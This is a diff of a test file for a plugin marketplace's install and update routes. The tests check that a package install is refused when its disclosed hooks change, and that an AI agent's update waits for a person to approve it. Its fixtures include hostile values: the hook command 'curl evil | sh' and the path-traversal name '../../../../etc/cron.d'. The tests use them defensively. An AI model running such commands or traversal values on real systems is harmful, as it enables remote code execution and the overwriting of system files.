@@ -55,6 +55,7 @@ import { PackageCacheRetention } from '../../services/marketplace/package-cache-
 import type { PackageFetcher } from '../../services/marketplace/package-fetcher.js';
 import {
   ConflictError,
+  DisclosureChangedError,
   InvalidPackageError,
   type InstallerLike,
 } from '../../services/marketplace/marketplace-installer.js';
@@ -87,6 +88,8 @@ import { createTestDb } from '@dorkos/test-utils/db';
 import { noopLogger } from '@dorkos/shared/logger';
 import { initConfigManager } from '../../services/core/config-manager.js';
 import type { MarketplaceMcpDeps } from '../../services/marketplace-mcp/marketplace-mcp-tools.js';
+import { TokenConfirmationProvider } from '../../services/marketplace-mcp/confirmation-provider.js';
+import type { DisclosedEffects } from '../../services/marketplace/disclosed-effects.js';
 import type { CapabilityRegistry } from '../../services/core/capabilities/index.js';
 
 const fixtureTarget = swappableServer();
@@ -183,16 +186,17 @@ function createFakeUninstallFlow(): FakeUninstallFlow {
 
 /**
  * Minimal UpdateFlow stub — the per-package `run`, the all-packages
- * `checkInstallations`, and the memo reset the refresh route calls.
+ * `planInstallations` / `applyPlan`, and the memo reset the refresh route calls.
  */
 interface FakeUpdateFlow {
   run: ReturnType<typeof vi.fn>;
-  checkInstallations: ReturnType<typeof vi.fn>;
+  planInstallations: ReturnType<typeof vi.fn>;
+  applyPlan: ReturnType<typeof vi.fn>;
   clearMemos: ReturnType<typeof vi.fn>;
 }
 
 function createFakeUpdateFlow(): FakeUpdateFlow {
-  return { run: vi.fn(), checkInstallations: vi.fn(), clearMemos: vi.fn() };
+  return { run: vi.fn(), planInstallations: vi.fn(), applyPlan: vi.fn(), clearMemos: vi.fn() };
 }
 
 function buildSamplePluginManifest(): PluginPackageManifest {
@@ -257,6 +261,10 @@ describe('Marketplace Routes', () => {
   let uninstallFlow: FakeUninstallFlow;
   let updateFlow: FakeUpdateFlow;
   let onPluginsChanged: ReturnType<typeof vi.fn>;
+  let consent: {
+    approveUpdates: ReturnType<typeof vi.fn>;
+    approveInstall: ReturnType<typeof vi.fn>;
+  };
   let agentScopes: Array<{ projectPath: string; id?: string; name?: string }>;
 
   beforeEach(() => {
@@ -268,6 +276,7 @@ describe('Marketplace Routes', () => {
     uninstallFlow = createFakeUninstallFlow();
     updateFlow = createFakeUpdateFlow();
     onPluginsChanged = vi.fn();
+    consent = { approveUpdates: vi.fn(), approveInstall: vi.fn() };
     agentScopes = [];
     agentHeader = undefined;
     signedInUser = undefined;
@@ -312,6 +321,8 @@ describe('Marketplace Routes', () => {
         onPluginsChanged,
         listAgentScopes: () => agentScopes,
         capabilityRegistry: () => gateRegistry,
+        confirmationProvider: new TokenConfirmationProvider(approvals),
+        consent,
       })
     );
 
@@ -1104,6 +1115,16 @@ describe('Marketplace Routes', () => {
       expect(res.body).toHaveProperty('preview');
       expect(res.body).toHaveProperty('manifest');
       expect(res.body).toHaveProperty('packagePath');
+      // What an install is held to, in the canonical form the caller sends back.
+      expect(res.body.disclosed).toEqual({
+        hooks: [],
+        schedules: [],
+        mcpServers: [],
+        lspServers: [],
+        monitors: [],
+        executables: [],
+        skillTools: [],
+      });
       expect(installer.preview.mock.calls[0][0]).toEqual({
         name: 'sample-plugin',
         marketplace: 'dorkos-community',
@@ -1151,6 +1172,83 @@ describe('Marketplace Routes', () => {
   });
 
   describe('POST /packages/:name/install', () => {
+    /** What the dialog was shown the package runs. */
+    const shownDisclosure: DisclosedEffects = {
+      hooks: [{ event: 'Stop', matcher: null, command: 'echo hi', source: null }],
+      schedules: [],
+      mcpServers: [],
+      lspServers: [],
+      monitors: [],
+      executables: [],
+      skillTools: [],
+    };
+
+    it('holds the install to what the person was shown, and records their approval for a global install', async () => {
+      // Purpose: the app's install sends back the preview's disclosure. The
+      // installer compares its own resolve against it; the person's yes then
+      // lets the global plugin load without a second card (DOR-2306).
+      installer.install.mockResolvedValue(buildSampleInstallResult());
+
+      const res = await request(fixtureServer)
+        .post('/api/marketplace/packages/sample-plugin/install')
+        .send({ approvedDisclosure: shownDisclosure });
+
+      expect(res.status).toBe(200);
+      expect(installer.install.mock.calls[0][0].approvedDisclosure).toEqual(shownDisclosure);
+      expect(consent.approveInstall).toHaveBeenCalledWith(
+        expect.objectContaining({ global: true, type: 'plugin' }),
+        shownDisclosure
+      );
+      expect(consent.approveInstall.mock.invocationCallOrder[0]).toBeLessThan(
+        onPluginsChanged.mock.invocationCallOrder[0] ?? 0
+      );
+    });
+
+    it("never records an agent's install as approved, even when it sends a disclosure", async () => {
+      // Purpose: an agent can read the preview too. Its global install loads
+      // only after a person approves the card activation raises.
+      agentHeader = 'agent-token';
+      installer.install.mockResolvedValue(buildSampleInstallResult());
+
+      const res = await request(fixtureServer)
+        .post('/api/marketplace/packages/sample-plugin/install')
+        .send({ approvedDisclosure: shownDisclosure });
+
+      expect(res.status).toBe(200);
+      expect(consent.approveInstall).not.toHaveBeenCalled();
+    });
+
+    it('records nothing for an install that sent no disclosure', async () => {
+      installer.install.mockResolvedValue(buildSampleInstallResult());
+
+      await request(fixtureServer).post('/api/marketplace/packages/sample-plugin/install').send({});
+
+      expect(consent.approveInstall).not.toHaveBeenCalled();
+    });
+
+    it('answers 409 disclosure_changed when the package now runs something else', async () => {
+      installer.install.mockRejectedValue(
+        new DisclosureChangedError('1 shell command ("echo hi")', '1 shell command ("curl | sh")')
+      );
+
+      const res = await request(fixtureServer)
+        .post('/api/marketplace/packages/sample-plugin/install')
+        .send({ approvedDisclosure: shownDisclosure });
+
+      expect(res.status).toBe(409);
+      expect(res.body.code).toBe('disclosure_changed');
+      expect(consent.approveInstall).not.toHaveBeenCalled();
+    });
+
+    it('refuses a disclosure that is not the right shape', async () => {
+      const res = await request(fixtureServer)
+        .post('/api/marketplace/packages/sample-plugin/install')
+        .send({ approvedDisclosure: { hooks: 'everything' } });
+
+      expect(res.status).toBe(400);
+      expect(installer.install).not.toHaveBeenCalled();
+    });
+
     it('returns the InstallResult on happy path', async () => {
       const result = buildSampleInstallResult();
       installer.install.mockResolvedValue(result);
@@ -1672,7 +1770,7 @@ describe('Marketplace Routes', () => {
         name: 'project-only',
       });
       vi.mocked(validateBoundary).mockResolvedValueOnce(projectDir);
-      updateFlow.run.mockResolvedValue({ checks: [], applied: [] });
+      updateFlow.run.mockResolvedValue({ checks: [] });
 
       const res = await request(fixtureServer)
         .post('/api/marketplace/packages/project-only/update')
@@ -1693,7 +1791,7 @@ describe('Marketplace Routes', () => {
         ...buildSamplePluginManifest(),
         name: '../../../../etc/cron.d',
       });
-      updateFlow.run.mockResolvedValue({ checks: [], applied: [] });
+      updateFlow.run.mockResolvedValue({ checks: [] });
 
       const res = await request(fixtureServer)
         .post('/api/marketplace/packages/honest-plugin/update')
@@ -1721,7 +1819,7 @@ describe('Marketplace Routes', () => {
         status: 'unknown',
         note: 'not installed in this scope',
       };
-      updateFlow.run.mockResolvedValue({ checks: [unknown], applied: [] });
+      updateFlow.run.mockResolvedValue({ checks: [unknown] });
 
       const res = await request(fixtureServer)
         .post('/api/marketplace/packages/agent-only/update')
@@ -1732,26 +1830,19 @@ describe('Marketplace Routes', () => {
       expect(updateFlow.run).toHaveBeenCalledTimes(1);
     });
 
-    it('still authorizes an apply as marketplace.install, and never an advisory check', async () => {
-      // Purpose: advisory is a read, apply reinstalls (ADR-0233); the new
-      // 404 check must not reorder or open a way around the gate. With no
-      // capability registry the gate fails closed, so an apply that consults
-      // it is refused, while an advisory read that never consults it runs.
-      gateRegistry = undefined as unknown as CapabilityRegistry;
-      updateFlow.run.mockResolvedValue({ checks: [], applied: [] });
-
-      const applied = await request(fixtureServer)
+    it('refuses apply: true with a 400 and reinstalls nothing (the retired unbound apply)', async () => {
+      // Purpose: this door used to reinstall with nothing shown and nothing
+      // bound, for any caller, agents included (DOR-2306). An update is applied
+      // only through POST /updates now; a caller that still sends `apply` must
+      // hear so, never receive a check it mistakes for an update.
+      const res = await request(fixtureServer)
         .post('/api/marketplace/packages/sample-plugin/update')
         .send({ apply: true });
-      expect(applied.status).toBe(403);
-      expect(applied.body.capabilityId).toBe('marketplace.install');
-      expect(updateFlow.run).not.toHaveBeenCalled();
 
-      const advisory = await request(fixtureServer)
-        .post('/api/marketplace/packages/sample-plugin/update')
-        .send({});
-      expect(advisory.status).toBe(200);
-      expect(updateFlow.run).toHaveBeenCalledTimes(1);
+      expect(res.status).toBe(400);
+      expect(updateFlow.run).not.toHaveBeenCalled();
+      expect(installGateInputs()).toEqual([]);
+      expect(onPluginsChanged).not.toHaveBeenCalled();
     });
 
     it("answers git's own failures with honest statuses and plain messages, not a 500", async () => {
@@ -1769,7 +1860,7 @@ describe('Marketplace Routes', () => {
         updateFlow.run.mockRejectedValueOnce(error);
         const res = await request(fixtureServer)
           .post('/api/marketplace/packages/sample-plugin/update')
-          .send({ apply: true });
+          .send({});
         expect(res.status).toBe(status);
         expect(res.body).toEqual({ error: error.message });
       }
@@ -1786,7 +1877,6 @@ describe('Marketplace Routes', () => {
             marketplace: 'dorkos-community',
           },
         ],
-        applied: [],
       });
 
       const res = await request(fixtureServer)
@@ -1796,101 +1886,12 @@ describe('Marketplace Routes', () => {
       expect(res.status).toBe(200);
       expect(res.body.checks).toHaveLength(1);
       expect(res.body.checks[0].hasUpdate).toBe(true);
-      expect(res.body.applied).toEqual([]);
       expect(updateFlow.run.mock.calls[0][0]).toMatchObject({
         name: 'sample-plugin',
         installation: { package: { scope: 'global' } },
       });
-      expect(updateFlow.run.mock.calls[0][0].apply).toBeUndefined();
-    });
-
-    it('returns the applied list when apply is true', async () => {
-      updateFlow.run.mockResolvedValue({
-        checks: [
-          {
-            packageName: 'sample-plugin',
-            installedVersion: '1.0.0',
-            latestVersion: '1.1.0',
-            hasUpdate: true,
-            marketplace: 'dorkos-community',
-          },
-        ],
-        applied: [buildSampleInstallResult()],
-      });
-
-      const res = await request(fixtureServer)
-        .post('/api/marketplace/packages/sample-plugin/update')
-        .send({ apply: true });
-
-      expect(res.status).toBe(200);
-      expect(res.body.applied).toHaveLength(1);
-      expect(updateFlow.run.mock.calls[0][0]).toMatchObject({ name: 'sample-plugin', apply: true });
-    });
-
-    it('authorizes and refreshes a GLOBAL reinstall as global, even when a project was named', async () => {
-      // Purpose: the reinstall stays global, so the approval must bind to the
-      // global install and the refresh must not project it into the project.
-      updateFlow.run.mockResolvedValue({ checks: [], applied: [buildSampleInstallResult()] });
-
-      await request(fixtureServer)
-        .post('/api/marketplace/packages/sample-plugin/update')
-        .send({ apply: true, projectPath: '/some/project' });
-
-      expect(installGateInputs()).toEqual([{ name: 'sample-plugin' }]);
-      expect(onPluginsChanged.mock.calls.map(([ctx]) => ctx)).toEqual([
-        { projectPath: undefined, packageName: 'sample-plugin', action: 'install' },
-      ]);
-    });
-
-    it("authorizes and refreshes a project's reinstall with the caller's spelling of the project", async () => {
-      // Purpose: when the project's own copy is what changes, the approval and
-      // the refresh name the project as the caller spelled it.
-      const projectDir = join(dorkHome, 'real-project');
-      writePackageManifest(join(projectDir, '.dork', 'plugins', 'sample-plugin'), {
-        ...buildSamplePluginManifest(),
-      });
-      vi.mocked(validateBoundary).mockResolvedValueOnce(projectDir);
-      updateFlow.run.mockResolvedValue({ checks: [], applied: [buildSampleInstallResult()] });
-
-      await request(fixtureServer)
-        .post('/api/marketplace/packages/sample-plugin/update')
-        .send({ apply: true, projectPath: '/work/link-to-project' });
-
-      expect(updateFlow.run.mock.calls[0][0]).toMatchObject({
-        installation: { package: { agentPath: projectDir } },
-      });
-      expect(installGateInputs()).toEqual([
-        { name: 'sample-plugin', projectPath: '/work/link-to-project' },
-      ]);
-      expect(onPluginsChanged.mock.calls.map(([ctx]) => ctx)).toEqual([
-        { projectPath: '/work/link-to-project', packageName: 'sample-plugin', action: 'install' },
-      ]);
-    });
-
-    it('does NOT fire onPluginsChanged for an advisory-only update (nothing applied)', async () => {
-      updateFlow.run.mockResolvedValue({ checks: [], applied: [] });
-
-      await request(fixtureServer).post('/api/marketplace/packages/sample-plugin/update').send({});
-
+      expect(installGateInputs()).toEqual([]);
       expect(onPluginsChanged).not.toHaveBeenCalled();
-    });
-
-    it('fires one onPluginsChanged per applied result, each with its RESOLVED name (DOR-264)', async () => {
-      const second = { ...buildSampleInstallResult(), packageName: 'other-plugin' };
-      updateFlow.run.mockResolvedValue({
-        checks: [],
-        applied: [buildSampleInstallResult(), second],
-      });
-
-      await request(fixtureServer)
-        .post('/api/marketplace/packages/sample-plugin/update')
-        .send({ apply: true, projectPath: '/some/project' });
-
-      expect(onPluginsChanged).toHaveBeenCalledTimes(2);
-      expect(onPluginsChanged.mock.calls.map((c) => c[0].packageName)).toEqual([
-        'sample-plugin',
-        'other-plugin',
-      ]);
     });
   });
 
@@ -1906,14 +1907,15 @@ describe('Marketplace Routes', () => {
         ...buildSamplePluginManifest(),
       });
       agentScopes = [{ projectPath: agentDir, id: 'alpha', name: 'Alpha' }];
-      updateFlow.checkInstallations.mockResolvedValue({ checks: [] });
+      updateFlow.planInstallations.mockResolvedValue({ checks: [], steps: [] });
     });
 
-    it('scans every scope once and checks what it found, without applying', async () => {
+    it('scans every scope once and checks what it found, saying what each new version runs', async () => {
       // Purpose: the whole point of the door — one scan, not one per package,
-      // and a read that never reinstalls anything.
+      // a read that never reinstalls anything, and every check disclosing what
+      // its new version runs, which is what an apply must send back (DOR-2306).
       const result = { checks: [{ packageName: 'sample-plugin', status: 'current' }] };
-      updateFlow.checkInstallations.mockResolvedValue(result);
+      updateFlow.planInstallations.mockResolvedValue({ ...result, steps: [] });
 
       const res = await request(fixtureServer).get('/api/marketplace/updates');
 
@@ -1923,9 +1925,10 @@ describe('Marketplace Routes', () => {
       expect(vi.mocked(scanInstallationRecords)).toHaveBeenCalledWith(dorkHome, {
         agents: agentScopes,
       });
-      expect(updateFlow.checkInstallations).toHaveBeenCalledTimes(1);
-      const [arg] = updateFlow.checkInstallations.mock.calls[0]!;
-      expect(arg.apply).toBeUndefined();
+      expect(updateFlow.planInstallations).toHaveBeenCalledTimes(1);
+      const [arg] = updateFlow.planInstallations.mock.calls[0]!;
+      expect(arg.disclose).toBe(true);
+      expect(updateFlow.applyPlan).not.toHaveBeenCalled();
       expect(arg.installations.map((r: { package: { scope: string } }) => r.package.scope)).toEqual(
         ['global', 'override']
       );
@@ -1952,7 +1955,7 @@ describe('Marketplace Routes', () => {
         const res = await request(fixtureServer).get(`${path}?projectPath=/a&projectPath=/b`);
         expect(res.status).toBe(400);
       }
-      expect(updateFlow.checkInstallations).not.toHaveBeenCalled();
+      expect(updateFlow.planInstallations).not.toHaveBeenCalled();
     });
 
     it('lists and checks a symlinked project at the same, canonical install paths', async () => {
@@ -1977,7 +1980,7 @@ describe('Marketplace Routes', () => {
         expect(row.installPath).toBe(
           join(realpathSync(realProject), '.dork', 'plugins', 'linked-view')
         );
-        const [arg] = updateFlow.checkInstallations.mock.calls[0]!;
+        const [arg] = updateFlow.planInstallations.mock.calls[0]!;
         expect(
           arg.installations.map((r: { package: { installPath: string } }) => r.package.installPath)
         ).toContain(row.installPath);
@@ -1996,161 +1999,256 @@ describe('Marketplace Routes', () => {
         .query({ projectPath: '/etc/evil' });
 
       expect(res.status).toBe(403);
-      expect(updateFlow.checkInstallations).not.toHaveBeenCalled();
+      expect(updateFlow.planInstallations).not.toHaveBeenCalled();
     });
   });
 
   describe('POST /updates', () => {
     let agentDir: string;
     const globalRoot = () => join(dorkHome, 'plugins', 'sample-plugin');
+    const agentRoot = () => join(agentDir, '.dork', 'plugins', 'sample-plugin');
+    const otherRoot = () => join(dorkHome, 'plugins', 'other-plugin');
+
+    /** What a new version runs: one hook, the given command. */
+    const runs = (command: string): DisclosedEffects => ({
+      hooks: [{ event: 'Stop', matcher: null, command, source: null }],
+      schedules: [],
+      mcpServers: [],
+      lspServers: [],
+      monitors: [],
+      executables: [],
+      skillTools: [],
+    });
+
+    /** What the check reports now, per installation: version 2.0.0, running `echo hi`. */
+    let now: Map<string, { latestVersion: string; disclosed: DisclosedEffects | null }>;
+
+    /** One target, as the app sends it: exactly what a check reported and a person saw. */
+    const shown = (installPath: string, command = 'echo hi', latestVersion = '2.0.0') => ({
+      installPath,
+      latestVersion,
+      disclosed: runs(command),
+    });
 
     beforeEach(() => {
       agentDir = join(dorkHome, 'agent-alpha');
       writePackageManifest(globalRoot(), { ...buildSamplePluginManifest() });
-      writePackageManifest(join(agentDir, '.dork', 'plugins', 'sample-plugin'), {
-        ...buildSamplePluginManifest(),
-      });
-      writePackageManifest(join(dorkHome, 'plugins', 'other-plugin'), {
-        ...buildSamplePluginManifest(),
-        name: 'other-plugin',
-      });
+      writePackageManifest(agentRoot(), { ...buildSamplePluginManifest() });
+      writePackageManifest(otherRoot(), { ...buildSamplePluginManifest(), name: 'other-plugin' });
       agentScopes = [{ projectPath: agentDir, id: 'alpha', name: 'Alpha' }];
-      updateFlow.checkInstallations.mockResolvedValue({ checks: [] });
+      now = new Map(
+        [globalRoot(), agentRoot(), otherRoot()].map((path) => [
+          path,
+          { latestVersion: '2.0.0', disclosed: runs('echo hi') },
+        ])
+      );
+      // A plan like the real flow's: every installation handed in is stale and
+      // says what its new version runs NOW.
+      updateFlow.planInstallations.mockImplementation(
+        async ({ installations }: { installations: { package: Record<string, unknown> }[] }) => ({
+          checks: installations.map(({ package: pkg }) => ({
+            packageName: pkg.name,
+            installPath: pkg.installPath,
+            type: pkg.type,
+            scope: pkg.scope,
+            ...(pkg.agentPath !== undefined && { agentPath: pkg.agentPath }),
+            status: 'update-available',
+            installedVersion: '1.0.0',
+            ...now.get(pkg.installPath as string),
+          })),
+          steps: [],
+        })
+      );
+      updateFlow.applyPlan.mockImplementation(
+        async (
+          plan: { checks: { installPath: string; packageName: string }[] },
+          approved: Map<string, unknown>
+        ) => ({
+          checks: plan.checks.map((c) =>
+            approved.has(c.installPath) ? { ...c, applied: { packageName: c.packageName } } : c
+          ),
+        })
+      );
     });
 
-    it('refuses a body that does not say apply: true, and runs nothing', async () => {
-      // Purpose: an empty or advisory POST must never be the request that
-      // reinstalls every package; the read is GET.
-      for (const body of [{}, { apply: false }]) {
+    it('refuses a body that does not say apply: true, names no targets, or uses a retired selector', async () => {
+      // Purpose: an empty or advisory POST must never reinstall anything, and an
+      // apply must name what the person was shown; `names` / `installPaths`
+      // selected without saying what would run (DOR-2306).
+      for (const body of [
+        {},
+        { apply: false, targets: [shown(globalRoot())] },
+        { apply: true },
+        { apply: true, targets: [] },
+        { apply: true, installPaths: [globalRoot()] },
+        { apply: true, names: ['sample-plugin'], targets: [shown(globalRoot())] },
+        { apply: true, targets: [{ installPath: globalRoot() }] },
+      ]) {
         const res = await request(fixtureServer).post('/api/marketplace/updates').send(body);
-        expect(res.status).toBe(400);
+        expect(res.status, JSON.stringify(body)).toBe(400);
       }
-      expect(updateFlow.checkInstallations).not.toHaveBeenCalled();
+      expect(updateFlow.planInstallations).not.toHaveBeenCalled();
+      expect(updateFlow.applyPlan).not.toHaveBeenCalled();
     });
 
-    it('applies to every installation of the named packages only', async () => {
-      // Purpose: `names` narrows the batch, and a name covers the package in
-      // every scope it is installed in.
+    it('applies exactly what the person was shown, held to it, and records their approval', async () => {
+      // Purpose: the app's apply. Exactly the targets, each installation held
+      // to the disclosure the person saw, and that yes recorded so a global
+      // plugin they just approved loads without a second card.
       const res = await request(fixtureServer)
         .post('/api/marketplace/updates')
-        .send({ apply: true, names: ['sample-plugin'] });
+        .send({ apply: true, targets: [shown(globalRoot()), shown(agentRoot())] });
 
       expect(res.status).toBe(200);
-      const [arg] = updateFlow.checkInstallations.mock.calls[0]!;
-      expect(arg.apply).toBe(true);
+      const [plan] = updateFlow.planInstallations.mock.calls[0]!;
+      expect(plan.disclose).toBe(true);
       expect(
-        arg.installations.map((r: { package: { name: string; scope: string } }) => [
-          r.package.name,
-          r.package.scope,
-        ])
-      ).toEqual([
-        ['sample-plugin', 'global'],
-        ['sample-plugin', 'override'],
+        plan.installations.map((r: { package: { installPath: string } }) => r.package.installPath)
+      ).toEqual([globalRoot(), agentRoot()]);
+      const [, approved] = updateFlow.applyPlan.mock.calls[0]!;
+      expect([...(approved as Map<string, unknown>).entries()]).toEqual([
+        [globalRoot(), runs('echo hi')],
+        [agentRoot(), runs('echo hi')],
       ]);
+      expect(consent.approveUpdates).toHaveBeenCalledTimes(1);
+      expect(approvals.listPending()).toEqual([]);
     });
 
-    it('returns 404 naming every unknown package, before anything runs', async () => {
+    it('refuses the whole apply when a new version now runs something it was not shown (the exploit)', async () => {
+      // Purpose: the source moved between the check and the apply — a hook was
+      // added. Nothing is reinstalled and nothing is recorded as approved; the
+      // caller is told to look again (DOR-2306).
+      now.set(globalRoot(), { latestVersion: '2.0.0', disclosed: runs('curl evil | sh') });
+
       const res = await request(fixtureServer)
         .post('/api/marketplace/updates')
-        .send({ apply: true, names: ['sample-plugin', 'flwo', 'gone'] });
+        .send({ apply: true, targets: [shown(globalRoot()), shown(agentRoot())] });
 
-      expect(res.status).toBe(404);
-      expect(res.body.error).toBe('Packages not installed: flwo, gone');
-      expect(res.body.packageNames).toEqual(['flwo', 'gone']);
-      expect(res.body.installPaths).toEqual([]);
-      expect(updateFlow.checkInstallations).not.toHaveBeenCalled();
+      expect(res.status).toBe(409);
+      expect(res.body.code).toBe('disclosure_changed');
+      expect(res.body.changed.map((u: { installPath: string }) => u.installPath)).toEqual([
+        globalRoot(),
+      ]);
+      expect(updateFlow.applyPlan).not.toHaveBeenCalled();
+      expect(consent.approveUpdates).not.toHaveBeenCalled();
     });
 
-    it('applies exactly the installations named by install path, and 404s an unknown one', async () => {
-      // Purpose: a confirm step lists installations; the apply must touch those
-      // and nothing else, and a path that is not in view must say which.
-      const agentRoot = join(agentDir, '.dork', 'plugins', 'sample-plugin');
+    it('refuses the whole apply when a newer version arrived than the one shown', async () => {
+      now.set(globalRoot(), { latestVersion: '3.0.0', disclosed: runs('echo hi') });
 
-      const ok = await request(fixtureServer)
+      const res = await request(fixtureServer)
         .post('/api/marketplace/updates')
-        .send({ apply: true, installPaths: [agentRoot] });
+        .send({ apply: true, targets: [shown(globalRoot())] });
 
-      expect(ok.status).toBe(200);
-      const [arg] = updateFlow.checkInstallations.mock.calls[0]!;
-      expect(
-        arg.installations.map((r: { package: { installPath: string } }) => r.package.installPath)
-      ).toEqual([agentRoot]);
+      expect(res.status).toBe(409);
+      expect(updateFlow.applyPlan).not.toHaveBeenCalled();
+    });
 
-      const missing = await request(fixtureServer)
+    it('never applies an agent’s update without a person approving the card (the exploit)', async () => {
+      // Purpose: an agent can read any disclosure the app can, so sending one
+      // back proves nothing. It gets the card `marketplace_update` raises, and
+      // nothing is reinstalled or recorded until a person grants it.
+      agentHeader = 'agent-token';
+      const body = { apply: true, targets: [shown(globalRoot())] };
+
+      const first = await request(fixtureServer).post('/api/marketplace/updates').send(body);
+
+      expect(first.status).toBe(202);
+      expect(first.body.status).toBe('requires_confirmation');
+      expect(first.body.updates.map((u: { installPath: string }) => u.installPath)).toEqual([
+        globalRoot(),
+      ]);
+      expect(updateFlow.applyPlan).not.toHaveBeenCalled();
+      expect(consent.approveUpdates).not.toHaveBeenCalled();
+      const pending = approvals.listPending();
+      expect(pending).toHaveLength(1);
+      // The card lists what the new version runs, in full.
+      expect(pending[0]?.detail).toContain('echo hi');
+
+      // A retry before anyone decided still runs nothing.
+      const early = await request(fixtureServer)
         .post('/api/marketplace/updates')
-        .send({ apply: true, installPaths: ['/nowhere/sample-plugin'] });
+        .send({ ...body, confirmationToken: first.body.confirmationToken });
+      expect(early.status).toBe(202);
+      expect(updateFlow.applyPlan).not.toHaveBeenCalled();
 
-      expect(missing.status).toBe(404);
-      expect(missing.body.installPaths).toEqual(['/nowhere/sample-plugin']);
-      expect(missing.body.packageNames).toEqual([]);
-      expect(updateFlow.checkInstallations).toHaveBeenCalledTimes(1);
+      approvals.grant(pending[0]!.approvalId);
+      const granted = await request(fixtureServer)
+        .post('/api/marketplace/updates')
+        .send({ ...body, confirmationToken: first.body.confirmationToken });
+
+      expect(granted.status).toBe(200);
+      expect(updateFlow.applyPlan).toHaveBeenCalledTimes(1);
+      expect(consent.approveUpdates).toHaveBeenCalledTimes(1);
+    });
+
+    it('runs nothing for an agent when the person says no', async () => {
+      agentHeader = 'agent-token';
+      const body = { apply: true, targets: [shown(globalRoot())] };
+      const first = await request(fixtureServer).post('/api/marketplace/updates').send(body);
+      for (const pending of approvals.listPending()) approvals.deny(pending.approvalId, 'not now');
+
+      const res = await request(fixtureServer)
+        .post('/api/marketplace/updates')
+        .send({ ...body, confirmationToken: first.body.confirmationToken });
+
+      expect(res.status).toBe(403);
+      expect(res.body).toEqual({ status: 'declined', reason: 'not now' });
+      expect(updateFlow.applyPlan).not.toHaveBeenCalled();
+    });
+
+    it('does not let an agent’s approved card stretch over a version that changed after it', async () => {
+      // Purpose: the card is bound to what it showed. A hook added after the yes
+      // is a new disclosure: the caller gets a 409 and nothing runs.
+      agentHeader = 'agent-token';
+      const body = { apply: true, targets: [shown(globalRoot())] };
+      const first = await request(fixtureServer).post('/api/marketplace/updates').send(body);
+      approvals.grant(approvals.listPending()[0]!.approvalId);
+      now.set(globalRoot(), { latestVersion: '2.0.0', disclosed: runs('curl evil | sh') });
+
+      const res = await request(fixtureServer)
+        .post('/api/marketplace/updates')
+        .send({ ...body, confirmationToken: first.body.confirmationToken });
+
+      expect(res.status).toBe(409);
+      expect(updateFlow.applyPlan).not.toHaveBeenCalled();
+    });
+
+    it('404s an install path that is not in view, before anything runs', async () => {
+      const res = await request(fixtureServer)
+        .post('/api/marketplace/updates')
+        .send({ apply: true, targets: [shown('/nowhere/sample-plugin')] });
+
+      expect(res.status).toBe(404);
+      expect(res.body.installPaths).toEqual(['/nowhere/sample-plugin']);
+      expect(updateFlow.planInstallations).not.toHaveBeenCalled();
     });
 
     it('refreshes once per reinstall that landed, in that installation’s own scope', async () => {
-      // Purpose: every reinstall must reach projection and the command cache
-      // exactly as a per-package apply does, with the project it landed in —
-      // and a failed one must not claim a change.
-      updateFlow.checkInstallations.mockResolvedValue({
-        checks: [
-          {
-            packageName: 'sample-plugin',
-            scope: 'global',
-            applied: { packageName: 'sample-plugin' },
-          },
-          {
-            packageName: 'sample-plugin',
-            scope: 'override',
-            agentPath: agentDir,
-            applied: { packageName: 'sample-plugin' },
-          },
-          { packageName: 'other-plugin', scope: 'global', applyError: 'disk full' },
-          { packageName: 'current-one', scope: 'global', status: 'current' },
-        ],
-      });
-
       const res = await request(fixtureServer)
         .post('/api/marketplace/updates')
-        .send({ apply: true });
+        .send({ apply: true, targets: [shown(globalRoot()), shown(agentRoot())] });
 
       expect(res.status).toBe(200);
       expect(onPluginsChanged.mock.calls.map(([ctx]) => ctx)).toEqual([
         { projectPath: undefined, packageName: 'sample-plugin', action: 'install' },
         { projectPath: agentDir, packageName: 'sample-plugin', action: 'install' },
       ]);
+      // The approval is recorded before the refresh that reads it.
+      expect(consent.approveUpdates.mock.invocationCallOrder[0]).toBeLessThan(
+        onPluginsChanged.mock.invocationCallOrder[0] ?? 0
+      );
     });
 
-    it('names the requested project the way the caller spelled it', async () => {
-      // Purpose: listeners match the project as the person picked it; only the
-      // effect itself runs against the canonical path.
-      updateFlow.checkInstallations.mockResolvedValue({
-        checks: [
-          {
-            packageName: 'sample-plugin',
-            scope: 'agent-local',
-            agentPath: '/resolved/project',
-            applied: { packageName: 'sample-plugin' },
-          },
-        ],
-      });
-
+    it('authorizes every distinct reinstall as marketplace.install, with its own scope, first', async () => {
+      // Purpose: the tier gate still answers for every reinstall, before any
+      // network work. Asking only about the first would let the rest run unasked.
       await request(fixtureServer)
         .post('/api/marketplace/updates')
-        .send({ apply: true, projectPath: '/work/link-to-project' });
-
-      expect(vi.mocked(scanInstallationRecords)).toHaveBeenCalledWith(dorkHome, {
-        projectPath: '/resolved/project',
-      });
-      expect(onPluginsChanged).toHaveBeenCalledWith({
-        projectPath: '/work/link-to-project',
-        packageName: 'sample-plugin',
-        action: 'install',
-      });
-    });
-
-    it('authorizes every distinct reinstall as marketplace.install, with its own scope', async () => {
-      // Purpose: the route loops the tier gate over the whole batch the door
-      // hands it. Asking only about the first would let the rest run unasked.
-      await request(fixtureServer).post('/api/marketplace/updates').send({ apply: true });
+        .send({
+          apply: true,
+          targets: [shown(globalRoot()), shown(agentRoot()), shown(otherRoot())],
+        });
 
       expect(installGateInputs()).toEqual([
         { name: 'other-plugin' },
@@ -2160,7 +2258,6 @@ describe('Marketplace Routes', () => {
     });
 
     it('stops at a refusal of a LATER reinstall, and runs nothing', async () => {
-      // Purpose: a yes for the first package is not a yes for the batch.
       // Once-only, so the next test gets the real gate back.
       vi.mocked(authorizeCapability)
         .mockImplementationOnce(vi.mocked(authorizeCapability).getMockImplementation()!)
@@ -2171,57 +2268,72 @@ describe('Marketplace Routes', () => {
 
       const res = await request(fixtureServer)
         .post('/api/marketplace/updates')
-        .send({ apply: true });
+        .send({ apply: true, targets: [shown(globalRoot()), shown(agentRoot())] });
 
       expect(res.status).toBe(403);
       expect(installGateInputs()).toHaveLength(2);
-      expect(updateFlow.checkInstallations).not.toHaveBeenCalled();
-    });
-
-    it('lets an agent apply a batch, as install is tier act', async () => {
-      // Purpose: authorizing each reinstall must not start asking for approval
-      // an ordinary install never needs.
-      agentHeader = 'agent-token';
-
-      const res = await request(fixtureServer)
-        .post('/api/marketplace/updates')
-        .send({ apply: true });
-
-      expect(res.status).toBe(200);
-      expect(updateFlow.checkInstallations).toHaveBeenCalled();
+      expect(updateFlow.planInstallations).not.toHaveBeenCalled();
     });
 
     it('refuses a batch that would need a person to approve each install, and runs nothing', async () => {
-      // Purpose: a batch cannot carry one approval token per package, so a 202
-      // would send the caller round a loop. If install is ever raised to a tier
